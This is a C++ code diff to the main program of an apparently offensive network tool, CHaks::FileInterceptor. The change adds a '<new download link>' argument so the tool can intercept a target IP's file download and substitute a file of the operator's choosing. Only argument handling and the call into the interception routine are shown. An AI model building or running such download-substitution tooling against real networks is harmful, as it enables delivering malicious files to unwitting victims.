@@ -12,16 +12,17 @@ void PrintHelp(char** argv)
 {
     std::cout
         << "To use the program, provide the arguments in the following format:\n"
-        << argv[0] << " <interface name> <ip version> <target ip> <download link>\n\n"
+        << argv[0] << " <interface name> <ip version> <target ip> <download link> <new download link>\n\n"
         << "<interface name>: the interface you wish to use.\n"
         << "<ip version>: ip version of the target, must be 4 or 6\n"
         << "<target ip>: target whose file you wish to intercept\n"
-        << "<download link>: file you wish to replace\n\n"
+        << "<download link>: file you wish to replace\n"
+        << "<new download link>: the path to the file you want the target to download\n\n"
         << "Example: " << argv[0] << " eth0 "<< "4" << "10.0.2.4" << "download.example.co/testfile.exe" << std::endl;
 }
 
 // TODO: improve args processing
-int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, char* targetIP, char* downloadLink)
+int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, char* targetIP, char* downloadLink, char* newDownloadLink)
 {
     if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
     {
@@ -29,7 +30,7 @@ int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion,
         exit(EXIT_SUCCESS);
     }
 
-    if(argc != 5)
+    if(argc != 6)
         return APPLICATION_ERROR;
 
     if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
@@ -46,6 +47,7 @@ int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion,
 
     PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[3]);
     PacketCraft::CopyStr(downloadLink, DOWNLOAD_LINK_STR_SIZE, argv[4]);
+    PacketCraft::CopyStr(newDownloadLink, DOWNLOAD_LINK_STR_SIZE, argv[5]);
 
     return NO_ERROR;
 }
@@ -66,8 +68,9 @@ int main(int argc, char** argv)
     uint32_t ipVersion{};
     char targetIP[INET6_ADDRSTRLEN]{};
     char downloadLink[DOWNLOAD_LINK_STR_SIZE]{};
+    char newDownloadLink[DOWNLOAD_LINK_STR_SIZE]{};
 
-    if(ProcessArgs(argc, argv, interfaceName, ipVersion, targetIP, downloadLink) == APPLICATION_ERROR)
+    if(ProcessArgs(argc, argv, interfaceName, ipVersion, targetIP, downloadLink, newDownloadLink) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
         PrintHelp(argv);
@@ -77,7 +80,7 @@ int main(int argc, char** argv)
     int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
 
     CHaks::FileInterceptor fileInterceptor;
-    if(fileInterceptor.Run(socketFd, interfaceName, ipVersion, targetIP, downloadLink) == APPLICATION_ERROR)
+    if(fileInterceptor.Run(socketFd, interfaceName, ipVersion, targetIP, downloadLink, newDownloadLink) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
         close(socketFd);
